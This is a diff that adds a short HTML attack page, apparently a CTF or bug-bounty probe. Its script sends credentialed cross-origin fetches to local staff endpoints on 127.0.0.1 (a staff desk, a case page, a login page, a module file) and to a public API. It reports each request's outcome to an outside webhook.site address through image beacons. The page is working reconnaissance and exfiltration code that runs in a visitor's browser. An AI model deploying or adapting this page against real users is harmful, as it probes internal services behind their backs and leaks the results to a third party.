@@ -1,0 +1,12 @@
+<!doctype html><html><head><title>p10</title></head><body>p10
+<script>
+var H="https://webhook.site/4b355a3b-6bd1-4a29-a69e-8f84325671d6";
+function b(k,v){try{var i=new Image();i.src=H+"/r?k="+encodeURIComponent(k)+"&v="+encodeURIComponent(String(v).slice(0,400));}catch(e){}}
+function probe(tag,url){return fetch(url,{mode:"cors",redirect:"manual",credentials:"include",cache:"no-store"}).then(function(r){b(tag,"RESOLVED type="+r.type+" status="+r.status)},function(e){b(tag,"REJECTED "+e.name+":"+e.message)})}
+b("start10","1");
+probe("staff_desk","https://127.0.0.1:8443/staff");
+probe("case_page","https://127.0.0.1:8443/staff/cases/BT-017");
+probe("login_page","https://127.0.0.1:8443/staff/login");
+probe("graph","https://127.0.0.1:8443/staff/cases/BT-017/graph.mjs");
+probe("public1337","http://127.0.0.1:1337/api/public/overview");
+</script></body></html>
